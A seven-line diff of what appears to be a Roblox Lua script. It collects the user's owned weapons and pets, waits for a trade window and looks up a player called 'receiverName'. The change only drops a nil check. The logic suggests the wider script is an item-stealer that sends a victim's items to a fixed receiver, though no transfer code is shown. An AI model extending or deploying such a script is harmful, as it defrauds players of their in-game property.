@@ -92,7 +92,7 @@ local function baiiii()
     local ownedWeapons, ownedPets = inventoryMeow()
     print(ownedWeapons, ownedPets)
 
-    while not (tradeGUI and tradeGUI.Enabled) do
+    while not tradeGUI.Enabled do
         if ownedWeapons or ownedPets then
             wait(1)
             local target = game:GetService("Players"):FindFirstChild(receiverName)
